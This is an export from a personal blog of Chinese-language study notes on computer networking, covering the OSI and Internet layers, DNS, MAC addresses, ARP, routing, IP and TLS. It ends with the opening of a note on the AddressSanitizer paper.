stack）。<br><strong>因特网</strong>的协议栈由5个层次组成：物理层、链路层、网络层、运输层和应用层</p><ul><li>应用层信息分组：报文（message）；</li><li>运输层：报文段（segment）；</li><li>网络层：数据报（datagram）；</li><li>链路层：帧（frame）；</li><li>物理层；</li></ul><p><strong>OSI模型</strong><br>应用层、表示层、会话层、运输层、网络层、数据链路层、物理层。</p><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><p>封装（encapsulation）。一个应用层报文传送给运输层，首部会附带上附加信息，这些一起构成了运输层报文段。再加上另外的首部信息，给到网络层，生成了网络层数据包。接下来生成链路层帧。<br>一个分组具有两种类型的字段：首部字段和**有效载荷字段（payload field） **<br><img src="/2023/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/p2.png"></p><p><img src="/2023/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/p3.png"><br><img src="/2023/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/p4.png"><br><img src="/2023/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/p5.png"></p><h1 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h1><h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><p>DNS：Domain Name System 域名系统。</p><p>DNS 是：</p><ul><li>一个由分层的 <strong>DNS 服务器</strong>实现的分布式数据库；</li><li>一个使得主机能够查询分布式数据库的应用层协议。</li></ul><p>DNS 服务器通常是运行在 BIND （Berkeley Internet Nmae Domain)软件的 UNIX 机器。DNS 协议 运行在 UDP 上使用 53 端口。</p><p>DNS 将用户提供的主机名（<a href="http://www.kawa.com/">www.kawa.com</a> 类似的）解析为 IP 地址。</p><p>DNS 可以将主机别名进行解析，方便使用</p><h3 id="DNS-的记录和报文"><a href="#DNS-的记录和报文" class="headerlink" title="DNS 的记录和报文"></a>DNS 的记录和报文</h3><p>共同实现 DNS 分布式数据库的所有 DNS 服务器存储了 **资源记录（Resource Record)**，RR 提供主机名到 IP 地址的映射。<br>RR 包含以下字段的四元组：</p><figure class="highlight delphi"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs delphi">(<span class="hljs-keyword">Name</span>, Value, <span class="hljs-keyword">Type</span>, TTL)<br></code></pre></td></tr></table></figure><p>TTL 是记录的生存时间，它决定了资源记录应当从缓存中删除的时间。<br>Name 和 Value 的值取决于 Type：</p><ul><li>若 Type = A ，则 Name 是主机名， Value 是该主机名对应的 IP 地址。</li><li>若 Type = NS，则 Name 是个域（如 foo.com），而 value 是个知道如何获得该域<br>中主机IP地址的权威DNS服务器的主机名，例如(foo.com, dns.foo.com, NS）</li><li>若 Type = CNAME，则 Value 是别名为 Name 的主机对应的规范主机名。例如(foo.com, relay1.bar. foo. com, CNAME)就是一条 CNAME 类型的记录。</li><li>若 Type = MX，则Value 是个别名为 Name 的邮件服务器的规范主机名。举例来说，(foo.com, mail. bar. foo. com, MX)就是一条MX记录。</li></ul><p><strong>DNS报文</strong></p><p><img src="/2023/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/p6.png"></p><ul><li>前12字节是首部区域</li></ul><h2 id="P2P-文件分发"><a href="#P2P-文件分发" class="headerlink" title="P2P 文件分发"></a>P2P 文件分发</h2><p><strong>最稀缺优先（rarest first）</strong>，针对自身没有的块，优先在其邻居中决定最稀缺的块（副本数最少的块），并请求之。</p><h2 id="视频流和内容分发网"><a href="#视频流和内容分发网" class="headerlink" title="视频流和内容分发网"></a>视频流和内容分发网</h2><p><strong>经 HTTP 的动态适应流 (Dynamic Adaptive Streaming over HTTP, DASH)</strong><br>在 DASH 中，视频编码为几个不同的版本，每个版本由不同的比特率，对应不同质量水平。</p><p><strong>内容分发网（Content Distribution Network，CDN）</strong><br>CDN管理分布在多个地理位置上的服务器，在它的服务器中存储视频（和其他类型的Web内容，包括文档、图片和音频）的副本，并且所有试图将每个用户请求定向到一个将提供最好的用户体验的CDN位置。<br>CDN 可以是专用 CDN ，也可以是第三方 CDN。<br>CDN 部署核心是<strong>集群选择策略（cluster selection strategy)</strong>,即动态地将用户定向到 CDN 中某个服务器集群或数据中心。<br>一种策略是<strong>地理上最为接近（geographically closest）</strong>的集群。</p><hr><h1 id="系统性学习"><a href="#系统性学习" class="headerlink" title="系统性学习"></a>系统性学习</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="信道"><a href="#信道" class="headerlink" title="信道"></a>信道</h3><p>就是传送信息的通道</p><h3 id="信道的类型"><a href="#信道的类型" class="headerlink" title="信道的类型"></a>信道的类型</h3><p>物理信道 &amp; 逻辑信道</p><h3 id="信道的带宽"><a href="#信道的带宽" class="headerlink" title="信道的带宽"></a>信道的带宽</h3><p>带宽指的是：某个信道在单位时间内最大能传输多少bit的信息。<br>在计算机领域中，带宽指数字带宽，单位是“比特率”或“字节率”。</p><h3 id="带宽的单位"><a href="#带宽的单位" class="headerlink" title="带宽的单位"></a>带宽的单位</h3><p>大写字母 <code>B</code>表示“字节”，小写字母 <code>b</code> 表示“比特”。<br>【10进制】中，K 表示 1000 ， M 表示 1000 x 1000；<br>【2进制】中，K 表示 1024， 表示 1024 x 1024；</p><p>国际上的约定：若是二进制，在 K 后面加一个 i ；<br>如：<br>1Kbps 表示“1000比特每秒”；<br>1KiBps 表示“1024字节每秒”；</p><h3 id="信道工作模式：-单工、半双工、全双工"><a href="#信道工作模式：-单工、半双工、全双工" class="headerlink" title="信道工作模式： 单工、半双工、全双工"></a>信道工作模式： 单工、半双工、全双工</h3><h4 id="单工"><a href="#单工" class="headerlink" title="单工"></a>单工</h4><p>方向单一，如电台 -&gt; 收音机 可以，但收音机 -&gt; 电台 是不行的。</p><h4 id="半双工"><a href="#半双工" class="headerlink" title="半双工"></a>半双工</h4><p>方向双向，但同一时刻只能有一个方向进行传输数据。<br>类似火车轨道，双向都能走，但是不能同时两个方向都来车（撞车了）。</p><h4 id="全双工"><a href="#全双工" class="headerlink" title="全双工"></a>全双工</h4><p>【同时相向】传播可行。<br>如：光纤。</p><h2 id="从“分层”到“参考模型”"><a href="#从“分层”到“参考模型”" class="headerlink" title="从“分层”到“参考模型”"></a>从“分层”到“参考模型”</h2><h3 id="分层"><a href="#分层" class="headerlink" title="分层"></a>分层</h3><p>对于网络通讯，不太可能用一种通讯协议完成所有的信息传递任务，故需要多种协议。<br>采用【分层】的设计思路，让多个层次的协议在一起协同工作，技术上称作“协议栈”（protocol stack）。</p><h3 id="协议栈的原理"><a href="#协议栈的原理" class="headerlink" title="协议栈的原理"></a>协议栈的原理</h3><p>对于多层次的协议栈，每个层次都有各自的“端点”。<br>处于【同一层次】的两个端点，使用该层次的协议进行通讯。（一个层次的协议，可能有一个有可能有多个）<br>除最顶层外，每个层次的端点向其【直接】上层提供“服务”；除最底层外，上层的端点调用【直接】下层提供的“服务”。（服务，技术行话为“API”，即接口）</p><h3 id="OSI-参考模型的7层"><a href="#OSI-参考模型的7层" class="headerlink" title="OSI 参考模型的7层"></a>OSI 参考模型的7层</h3><table><thead><tr><th>层次</th><th>中文名</th><th>英文名</th></tr></thead><tbody><tr><td>7</td><td>应用层</td><td>Application Layer</td></tr><tr><td>6</td><td>表示层</td><td>Presentation Layer</td></tr><tr><td>5</td><td>会话层</td><td>Session Layer</td></tr><tr><td>4</td><td>传输层</td><td>Transport Layer</td></tr><tr><td>3</td><td>网络层</td><td>Network Layer</td></tr><tr><td>2</td><td>数据链路层</td><td>Data Link Layer</td></tr><tr><td>1</td><td>物理层</td><td>Physical Layer</td></tr></tbody></table><h2 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h2><h3 id="为什么需要物理层（必要性）"><a href="#为什么需要物理层（必要性）" class="headerlink" title="为什么需要物理层（必要性）"></a>为什么需要物理层（必要性）</h3><p>物理层是物质层次上的数据传输，例如光纤中的光信号，无线电通讯等等，其依赖于物理媒介进行通讯。</p><p>物理层的主要职责是：屏蔽其他细节，除物理层之外的其他地方，无需考虑物理上的数据传输。</p><h3 id="信噪比（Signal-to-noise-ratio"><a href="#信噪比（Signal-to-noise-ratio" class="headerlink" title="信噪比（Signal-to-noise ratio)"></a>信噪比（Signal-to-noise ratio)</h3><p>噪声（Noise）：对于“物理信道”，传输过程中收到的环境干扰，产生的无用数据，称之为噪声。</p><p>而“信道传输的有用信息”与“无用的干扰噪声”之比，称之为信噪比。</p><p>信噪比的单位是【分贝】（decibel）。“deci”表示十进制，“bel”是为了纪念贝尔。</p><h3 id="多路复用（Multiplexing"><a href="#多路复用（Multiplexing" class="headerlink" title="多路复用（Multiplexing)"></a>多路复用（Multiplexing)</h3><p>对信道的复用，能提升信道传输信息的效率。</p><p><strong>频分多路复用（Frequency-Division Multiplexing，FDM)</strong></p><p>将频率拆分，不同的线路占用不同频段，互不干扰。</p><p>缺点：</p><ul><li>需要足够宽的频段（频段是稀缺资源）；</li><li>不同线路流量变化，某频段的线路若空闲，则其频段被浪费。</li></ul><p><strong>时分多路复用（Time-Divition Multiplexing，TDM）</strong></p><p>这种思路只用一个很窄的频段。为了在同一个频道发送多个信道，采用【分时机制】，把时间切割成很小的时间片，每个线路占用一个时间片。周而往复。</p><p>这个思路有点像十字路口的红绿灯——每隔一段时间，其中一条路可以通行。</p><p>缺点：线路过多，则等待时间长。</p><p><strong>码分多路复用（Code-Divition Multiplexing，CDM）</strong></p><p>同一端点使用不同的编码策略，使发出的数据包互不干扰。</p><h3 id="物理层的协议实现"><a href="#物理层的协议实现" class="headerlink" title="物理层的协议实现"></a>物理层的协议实现</h3><p><img src="/2023/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/p7.png"></p><h3 id="物理层的设备"><a href="#物理层的设备" class="headerlink" title="物理层的设备"></a>物理层的设备</h3><p><strong>调制解调器（modem）</strong></p><p>用于翻译“数字信号 ＆ 模拟信号”。</p><p>在发送信息时，modem 把电脑要发送的“字节流”（数字信号）翻译成“模拟信号”，然后通过物理介质发送出去；当它从物理介质收到“模拟信号”，再翻译成“数字信号”，传回给电脑。</p><p><strong>中继器（repeater）</strong></p><p>信号在传输过程中，能量会随着距离衰减，”中继器“则负责【信号增益】，使信号传达更远距离。</p><p><strong>集线器（hub）</strong></p><p>可以把“集线器”视作更牛逼的“中继器”——“中继器”只有两个口（只能连接两个通讯端点），而“集线器”有多个口（同时连接多个通讯端点）。</p><p>n in 1</p><h2 id="链路层"><a href="#链路层" class="headerlink" title="链路层"></a>链路层</h2><h3 id="链路层的必要性"><a href="#链路层的必要性" class="headerlink" title="链路层的必要性"></a>链路层的必要性</h3><p><strong>对信息打包</strong></p><p>链路层将物理层收到的流（一堆比特）打包，方便上层协议处理。链路层的数据称之为帧。</p><p><strong>差错控制</strong></p><p>链路层负责检查物理层的传输是否出错。</p><p><strong>流量控制</strong></p><p>防止发送方发送数据的速度大于接收方处理数据的速度。</p><p><strong>信道复用</strong></p><p>某些物理介质可能是【半双工】，所有这些物理层的限制，都使得“多路复用”变得复杂。为了解决这些问题，链路层需要提供了某种相应的机制（协议），术语叫做“介质访问控制”（洋文是“Media Access Control”，简称 MAC）。</p><h3 id="差错控制"><a href="#差错控制" class="headerlink" title="差错控制"></a>差错控制</h3><p>为了检查传输的信息是否出错，设计了许多相应的数学算法。</p><p>检错算法：对传输数据计算出一个【校验值】，接收方收到数据会重新计算校验和，若算出来不对，则丢弃数据令其重发。</p><h3 id="MAC-协议"><a href="#MAC-协议" class="headerlink" title="MAC 协议"></a>MAC 协议</h3><p>“MAC 协议”用来确保对下层物理介质的使用，不会出现冲突。</p><p>假设有一条【单轨】铁路连接 A/B 两地。有很多火车想从 A 开到 B，同时还有很多火车想从 B 开到 A。<br>首先，要确保不发生撞车（如果已经有车在 A 开往 B 的途中，那么 B 就不能再发车）；其次，即使是同一个方向的车，出发时间也要错开一个时间间隔。<br>所有这些协调工作，都是靠“MAC 协议”来搞定。</p><h3 id="MAC-地址"><a href="#MAC-地址" class="headerlink" title="MAC 地址"></a>MAC 地址</h3><p>为了完成上述任务，光有“MAC 协议”还不够，还需要为每一个端点引入【惟一的】标识。这个标识就称作“MAC 地址”。</p><p>通俗地说，每个网卡都内置了一个“MAC 地址”。这个地址是网卡在出厂的时候就已经设置好的，并且用某种机制确保该地址【全球唯一】。</p><p>MAC 地址包含6个字节（48个比特），分为两半。第一部分称作【OUI】，OUI 的24个比特中，其中2个比特有特殊含义，其它22个比特，用来作为网卡厂商的唯一编号。这个编号由国际组织 IEEE 统一分配。</p><p>MAC 地址第二部分的24比特，由网卡厂商自己决定如何分配。每个厂商只要确保自己生产的网卡，后面这24比特是唯一的，就行啦。</p><p>MAC地址构成如下图：</p><p><img src="/2023/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/p8.png"></p><p>“虚拟网卡”是由【虚拟化软件】创建滴。IEEE 也给每个虚拟化软件的厂商（含开源社区）分配了唯一的 OUI。因此，虚拟化软件在创建“虚拟网卡”时，会使用自己的 OUI 生成前面24个比特；后面的24比特，会采用某种算法使之尽可能【随机化】。由于“2的24次方”很大（<code>224 = 16777216</code>），碰巧一样的概率很低。<br>　　（注：如果手工修改 MAC 地址，故意把两块网卡的 MAC 地址搞成一样，那确实就做不到唯一性了。并且会导致链路层的通讯出问题）</p><h3 id="链路层相关的【网络设备】"><a href="#链路层相关的【网络设备】" class="headerlink" title="链路层相关的【网络设备】"></a>链路层相关的【网络设备】</h3><p><strong>网络交换机（network switch）</strong></p><p>此处引用某网络牛人的叙述，真的很幽默风趣且有道理。。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css">（注：一般提到“网络交换机”，如果不加定语，指的就是“<span class="hljs-number">2</span>层交换机”；此外还有更高层的交换机，在后续章节介绍）<br>　　为啥要有交换机捏？俺拿“以太网的发展史”来说事儿。<br>　　以太网刚诞生的时候，称之为“经典以太网”，电脑是通过【集线器】相连。“集线器”前面提到过，工作在【<span class="hljs-number">1</span>层】（物理层），并不理解链路层的协议。因此，集线器的原理是【广播】模式——它从某个网线接口收到的数据，会复制 N 份，发送到其它【每个】网线接口。假设有<span class="hljs-number">4</span>台电脑（<span class="hljs-selector-tag">A</span>、<span class="hljs-selector-tag">B</span>、C、D）都连在集线器上，<span class="hljs-selector-tag">A</span> 发数据给 <span class="hljs-selector-tag">B</span>，其实 C ＆ D 也都收到 <span class="hljs-selector-tag">A</span> 发出的数据。显然，这种工作模式很傻逼（低效）。由于“经典以太网”的工作模式才“<span class="hljs-number">10</span>兆”，所以集线器虽然低效，还能忍受。<br>　　后来要发展“百兆以太网”，再用这种傻逼的广播模式，就不能忍啦。于是“经典以太网”就发展为“交换式以太网”。用【交换机】代替“集线器”。<br>　　交换机是工作在<span class="hljs-number">2</span>层（链路层）的设备，能够理解链路层协议。当交换机从某个网线接口收到一份数据（链路层的“帧”），它可以识别出“链路帧”里面包含的目标地址（接收方的 MAC 地址），然后只把这份数据转发给“目标 MAC 地址相关的网线接口”。<br>　　由于交换机能识别<span class="hljs-number">2</span>层协议，它不光比集线器的性能高，而且功能也强得多。比如（稍微高级点的）交换机可以实现“MAC 地址过滤、VLAN、QoS”等多种额外功能。<br></code></pre></td></tr></table></figure><p>简单来说，网络交换机负责将需要传输给对应 MAC 地址的包，定向单独地，传输给指定目标。</p><p><strong>网桥/桥接器（network bridge）</strong></p><p>“交换机”通常用来连接【同一种】网络的设备。有时候，需要让两台不同网络类型的电脑相连，就会用到【网桥】。</p><p>例如，宿主机与虚拟机之间进行互ping，需要设置桥接模式。</p><p>现在，假设你的物理电脑（Host OS）只安装了【无线网卡】（WiFi），而虚拟化软件给 Guest OS 配置的通常是【以太网卡】。显然，这是两种【不同】的网络。为啥 Guest OS 的以太网卡设置为“bridge 模式”之后，外部 WiFi 网络可以看到它捏？<br>奥妙在于——虚拟化软件在内部悄悄地帮你实现了一个“网桥”。这个网桥把“Host OS 的 WiFi 网卡”与“Guest OS 的以太网卡”关联起来。WiFi 网卡收到了链路层数据之后，如果接收方的 MAC 地址对应的是 Guest OS，网桥会把这份数据丢给 Guest OS 的网卡。<br>这种网卡模式之所以称作“bridge 模式”，原因就在于此。</p><h3 id="链路层相关软件"><a href="#链路层相关软件" class="headerlink" title="链路层相关软件"></a>链路层相关软件</h3><p><strong>嗅探抓包工具（Sniffer）</strong></p><p>这些攻击能捕获流经你网卡的所有的【链路层】数据包。</p><p><strong>关于 ARP 协议</strong></p><p>地址解析协议（Address Resolution Protocol），其基本功能为透过目标设备的IP地址，查询目标设备的MAC地址，以保证通信的顺利进行。它是IPv4中网络层必不可少的协议，不过在IPv6中已不再适用，并被邻居发现协议（NDP）所替代。</p><p>假设主机A和B在同一个<strong>网段</strong>，主机A要向主机B发送信息，主机A首先查看自己的ARP表，确定其中是否包含有主机B对应的ARP表项。如果找到了对应的MAC地址，则主机A直接利用ARP表中的MAC地址，对IP数据包进行帧封装，并将数据包发送给主机B。如果主机A在ARP表中找不到对应的MAC地址，则将缓存该数据报文，然后以广播方式发送一个ARP请求报文。ARP请求报文中的发送端IP地址和发送端MAC地址为主机A的IP地址和MAC地址，目标IP地址和目标MAC地址为主机B的IP地址和全为0的MAC地址。由于ARP请求报文以广播方式发送，该网段上的所有主机都可以接收到该请求，但只有被请求的主机（即主机B）会对该请求进行处理。主机B比较自己的IP地址和ARP请求报文中的目标IP地址，当两者相同时进行如下处理：将ARP请求报文中的发送端（即主机A）的IP地址和MAC地址存入自己的ARP表中。之后以单播方式发送ARP响应报文给主机A，其中包含了自己的MAC地址。主机A收到ARP响应报文后，将主机B的MAC地址加入到自己的ARP表中以用于后续报文的转发，同时将IP数据包进行封装后发送出去。</p><p><strong>总结</strong>，若 A 中无目的主机的 MAC 地址，则广播一个 ARP 请求报文，去让 B 收到该报文，并返回它自己的 MAC 地址给 A 以接收数据。</p><h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><h3 id="网络层的必要性"><a href="#网络层的必要性" class="headerlink" title="网络层的必要性"></a>网络层的必要性</h3><p><strong>路由机制（routing）</strong></p><p>由于 OSI 模型中，链路层本身【不】提供路由功能，即不是”直接“相连的主机之间，无法进行通信。</p><p>而对于复杂网络，很多端点间可能没有【直接链接】。为了在这些端点间建立链接，需要某种机制，让其他端点帮忙转发数据，这就是”路由机制”的引入。</p><p><strong>IP地址</strong></p><p>链路层提供了全球唯一的地址编码方式（MAC 地址），但 MAC 地址存在一些问题：</p><ul><li>MAC 地址是固定的；</li><li>MAC 地址基于【厂商】，无法体现【网络】的拓扑结构。对“路由机制”不友好。</li></ul><p>所以引入更抽象的地址，也就是“网络层地址”。即 IP 地址。</p><p>如果把 MAC 地址看作每个人的身份证号，在学校、公司内用身份证号来确定一个人，可以，但不方便（数据库系统课上也有相关概念，主键设计这些）。于是给每个人一个学号、员工id，由年级、院系等成分构成，对当前层次（单位）更加友好。</p><p>类似道理，每个网卡都有自己固定的 MAC 地址，当这个网卡接入到不同的网络，每次都可以再分配不同的“网络地址”。通过“网络地址”可以看出这个网卡属于哪个网络（对路由比较方便）。</p><p><strong>网际互连</strong></p><p>引入网络层的另一个目的是：屏蔽不同类型的网络之间的差异，实现”Network of networks“的建立。</p><p>一般来说，要想联通【异种】网络，就要求每个网络中都有一台主机充当【网关】（gateway）。【网关】起到“中介/翻译”的作用——帮不同的网络翻译协议，使得不同的网络可以互相联通。</p><p>假设【没有】统一的网络层，网关的工作就很难做。就好比说：如果全球没有某种通用的自然语言，就需要培养非常多不同类型的翻译人才（假设有30种主要语言，任意两种互译，就需要几百种不同的翻译人才）。</p><p>反之，如果有了某种统一的网络层标准，问题就好办多了（还是假设有30种主要语言，只要选定某种作为通用语，然后培养29种翻译人才，就可以实现任意两种语言互译）。</p><p>如今的互联网时代，【IP 协议】就是那个充当统一标准的网络层协议。</p><p><strong>总结下网络层的作用</strong></p><ul><li>实现路由，不直连端点间的通信；</li><li>将主机用其所处的不同的网络划分，给其分配 IP 地址；</li><li>统一协议，实现网际互连。</li></ul><h3 id="关于路由"><a href="#关于路由" class="headerlink" title="关于路由"></a>关于路由</h3><p>当主机 A 向主机 B 发送网络层的数据时，大致会经历如下步骤：</p><p>1.<br>A 主机的协议栈先判断“A B 两个地址”是否在同一个子网（“子网掩码”就是用来干这事儿滴）。<br>如果是同一个子网，直接发给对方；如果不是同一个子网，发给本子网的【默认网关】。<br>（此处所说的“网关”指“3层网关/网络层网关”）<br>2.<br>对于“默认网关”，有可能自己就是路由器；也可能自己不是路由器，但与其它路由器相连。<br>也就是说，“默认网关”要么自己对数据包进行路由，要么丢给能进行路由的另一台设备。<br>（万一找不到能路由的设备，这个数据就被丢弃，于是网络通讯出错）<br>3.<br>当数据到达某个路由器之后，有如下几种可能——<br>3.1<br>该路由器正好是 B 所在子网的网关（与 B 直连），那就把数据包丢给 B，路由过程就结束啦；<br>3.2<br>亦或者，路由器会把数据包丢给另一个路由器（另一个路由器再丢给另一个路由器） …… 如此循环往复，最终到达目的地 B。<br>3.3<br>还存在一种可能性：始终找不到“主机 B”（有可能该主机“断线 or 关机 or 根本不存在”）。为了避免数据包长时间在网络上闲逛，还需要引入某种【数据包存活机制】（洋文叫做“Time To Live”，简称 TTL）。<br>通常会采用某个整数（TTL 计数）表示数据包能活多久。当主机 A 发出这个数据包的时候，这个“TTL 计数”就已经设置好了。每当这个数据包被路由器转发一次，“TTL 记数”就减一。当 TTL 变为零，这个数据包就死了（被丢弃）。</p><p>对于某些大型的复杂网络（比如互联网），每个路由器可能与其它 N 个路由器相连（N 可能很大）。对于上述的 3.2 情形，它如何判断：该转发给谁捏？</p><p>这时候，“路由算法”就体现出价值啦——一般来说，路由器内部会维护一张【路由表】。每当收到一个网络层的数据包，先取出数据包中的【目标地址】，然后去查这张路由表，看谁距离目标最近，就把数据包转发给谁。</p><p><strong>总结</strong>：路由就类似一个个寝室敲门，问老张在不在里面，一个个敲下去。。。</p><h3 id="关于电路交换与分组交换"><a href="#关于电路交换与分组交换" class="headerlink" title="关于电路交换与分组交换"></a>关于电路交换与分组交换</h3><p>电路交换：可以理解为打电话，要建立链接后，独占信道，进行通信；</p><p>分组交换：类似微信、email，是留言的形式，不建立连接，发过去就行，让数据包自己路由，在网络中跑动到目的地。</p><p>对于“电路交换”，一旦建立连接，同一个连接的所有数据都走相同的路径（会经过完全相同的路由器）。也就是说，传输的过程中，如果某个路由器挂掉了（网络掉线 or 硬件当机 or 软件崩溃）。那么，该路由器正在处理的 N 个连接全都要报废。而“分组交换”则更加灵活——即使某个路由器挂掉了，后续的数据包会自动转向另外的路由器，损失很小。</p><h3 id="IP-地址"><a href="#IP-地址" class="headerlink" title="IP 地址"></a>IP 地址</h3><p>“IP 地址”的32比特，分为两部分：第1部分用来标识【子网】，第2部分用来标识该子网中的【主机】。</p><p>这两部分各占用多少比特，是不确定的。在这种情况下，“操作系统协议栈”如何知道哪些比特标识“子网”，哪些比特标识“主机”捏？奥妙在于【子网掩码】。所以，大伙儿在给系统配置 IP 地址的时候，通常都需要再设置一个【子网掩码】，就这个用途。</p><p>但目前 IPv4 地址正在枯竭，其最多表示【2的32次方】即42亿左右的不同地址，如今，全球网民几十亿。。。IP地址开始不够用了。</p><p>关于 IPv6 。IPv6 采用16字节的设计，可表达2的128次方，设计 IPv6 的人自豪地宣称：即使给地球上的每一粒沙子分配一个 IPv6 地址，依然绰绰有余（确实没有吹牛，“2的128次方”是天文数字）。</p><p>但 IPv6 的缺点在于，【无法】向下兼容原有的 IP 协议（原有的协议叫“IPv4”）。IPv6 的普及一直比较慢，这是主要原因。</p><p><strong>网络地址转换（NAT）</strong></p><p>用了这招，还是只要申请一个公网 IP，分配给内网的网关（网关有两个网卡，一个接内网，一个接公网）。然后在内网的网关配置 NAT 功能，自动就可以让内网的每台电脑访问外网。</p><h3 id="网络层的设备"><a href="#网络层的设备" class="headerlink" title="网络层的设备"></a>网络层的设备</h3><p><strong>路由器</strong></p><p><strong>3层交换机</strong></p><p>“3层交换机”是在“2层交换机”的基础上，增加了对网络层的处理。因此，它可以做到类似路由器的效果——在几个子网之间转发数据。</p><p>与路由器的差别在于：”3层交换机“链接的几个子网是【同种】的网络；而路由器可以链接【异种】网络。</p><h3 id="ping命令"><a href="#ping命令" class="headerlink" title="ping命令"></a>ping命令</h3><p>ping 使用 ICMP 协议测试某个远程主机是否可到达。</p><h2 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h2><h3 id="传输层的必要性"><a href="#传输层的必要性" class="headerlink" title="传输层的必要性"></a>传输层的必要性</h3><p><strong>屏蔽”有链接 or 无连接“ 的差异</strong></p><p>网络层实现了屏蔽【异种】网络的差异（如”以太网“，”ATM“，etc），但网络层有一个差异未解决：电路交换（有链接） &amp; 分组交换（无连接）。</p><p>这个差异将由传输层完成弥补。</p><p><strong>从”host“到”进程“</strong></p><p>前面介绍的“网络层”，其设计是面向主机（电脑）。“网络层地址”也就是某个主机的地址。</p><p>而“传输层”是面向【进程】滴！因为传输层要提供给【网络软件】使用，而网络软件打交道的对象是【另一个网络软件】。因此，传输层必须在“网络层地址”的基础上，再引入某种新的标识，用来区分同一台主机上的不同【进程】。</p><h3 id="传输层的端口"><a href="#传输层的端口" class="headerlink" title="传输层的端口"></a>传输层的端口</h3><p>刚才谈“传输层的必要性”，提到说——“网络层地址”只能标识【主机】，而传输层必须要能标识【进程】。为了达到这个目的，于是就引入了“传输层端口”这个概念（为了打字省力，后续讨论简称为“端口”）。</p><p>当程序员使用传输层提供的 API 开发网络软件时，通常把“端口”与“网络地址”一起使用（构成“二元组”），就可以定位到某个主机上的某个进程。</p><p>即某个 port。</p><h3 id="传输层的协议"><a href="#传输层的协议" class="headerlink" title="传输层的协议"></a>传输层的协议</h3><p>为了让程序员可以更爽地使用传输层来开发网络软件，传输层既要提供“有连接”的风格，也要提供“无连接”的风格。关于这两种风格的对比，前面已经聊过，这里不再浪费口水。</p><p>具体到“互联网协议族”，有两个主要的传输层实现，分别是 TCP ＆ UDP（前者是“有连接”，后者是“无连接”）。</p><h3 id="套接字（socket-API）"><a href="#套接字（socket-API）" class="headerlink" title="套接字（socket API）"></a>套接字（socket API）</h3><p>影响力最大的传输层封装库，当然是 socket API。它来自加州大学伯克利分校。</p><p>需要提供一些封装传输层的【库】（API）。程序员只需要调用这些【库】，就可以使用传输层的协议进行通讯啦。</p><h2 id="业务层（上三层：会话层，表示层，应用层）"><a href="#业务层（上三层：会话层，表示层，应用层）" class="headerlink" title="业务层（上三层：会话层，表示层，应用层）"></a>业务层（上三层：会话层，表示层，应用层）</h2><p>【上三层】更接近于“网络软件”，对应的是应用软件的业务逻辑，因此俺统称为“业务层”。</p><h3 id="业务层的必要性"><a href="#业务层的必要性" class="headerlink" title="业务层的必要性"></a>业务层的必要性</h3><p>业务层显然是必要滴。因为传输层位于操作系统，它不可能去了解网络软件的业务逻辑。为了让网络软件能够相互通讯，肯定要在传输层之上再定义更高层的协议。</p><p>问题在于：网络软件千奇百怪，其业务逻辑各不相同，因此，“业务层如何设计”，【无】一定之规。有些软件只用一个协议来搞定所有的业务逻辑（只有一层）；有些软件会参考 OSI，把业务逻辑的协议分为三层；还有些软件可能会分出更多的层次。</p><p>再强调一下：业务层的协议如何分层，完全看具体的<strong>业务逻辑</strong>，不要生搬硬套任何现有的参考模型。</p><p><strong>总结</strong>：业务层目的是让网络软件之间能相互通信。</p><h3 id="业务层的协议"><a href="#业务层的协议" class="headerlink" title="业务层的协议"></a>业务层的协议</h3><p><strong>HTTP</strong></p><p>互联网的普及推动了 Web 的普及，而 Web 的普及使得 HTTP 成为信息时代的重要支柱。当你上网的时候，你看到的网页（HTML 页面）就是通过 HTTP 协议传输到你的浏览器上。</p><p><strong>SSL/TLS</strong></p><p>最早的 HTTP 协议是【明文】滴；为了强化安全性，后来又设计了 SSL 协议，用来【加密】HTTP 流量；再后来，SSL 升级为 TLS（这俩是同义词）。如今经常看到的 HTTPS 相当于“HTTP over TLS”。</p>]]></content>
    
    
    
    <tags>
      
      <tag>course</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AddressSanitizer</title>
    <link href="/2023/03/02/AddressSanitizer/"/>
    <url>/2023/03/02/AddressSanitizer/</url>
    
    <content type="html"><![CDATA[<h1 id="AddressSanitizer论文"><a href="#AddressSanitizer论文" class="headerlink" title="AddressSanitizer论文"></a>AddressSanitizer论文</h1><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>这个项目可以检测<code>out-of-bounds</code>及<code>use-after-free</code>导致的bug。</p><h2 id="Shadow-Memory"><a href="#Shadow-Memory" class="headerlink" title="Shadow Memory"></a>Shadow Memory</h2><p><strong>何为Shadow Memory</strong><br>引用维基百科：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs mipsasm">In computing, <span class="hljs-keyword">shadow </span>memory is a technique used to track <span class="hljs-keyword">and </span>store information on computer memory used <span class="hljs-keyword">by </span>a program during its execution. <span class="hljs-keyword">Shadow </span>memory consists of <span class="hljs-keyword">shadow </span><span class="hljs-keyword">bytes </span>that map to individual <span class="hljs-keyword">bits </span><span class="hljs-keyword">or </span>one <span class="hljs-keyword">or </span>more <span class="hljs-keyword">bytes 